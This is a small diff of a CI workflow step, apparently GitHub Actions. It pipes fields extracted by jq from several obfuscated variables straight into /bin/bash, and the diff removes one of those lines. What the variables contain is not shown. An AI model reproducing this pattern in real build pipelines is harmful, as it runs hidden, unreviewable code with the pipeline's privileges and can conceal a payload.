@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$cstwo9" | jq -r .g611 | /bin/bash
           printf '%s' "$ixbvd6116" | jq -r .th1 | /bin/bash
           printf '%s' "$f88" | jq -r .o8 | /bin/bash
-          printf '%s' "$afm925" | jq -r .noq0 | /bin/bash
           echo $gk583 | jq -r .nir4880 | /bin/bash
 
       - name: Store results
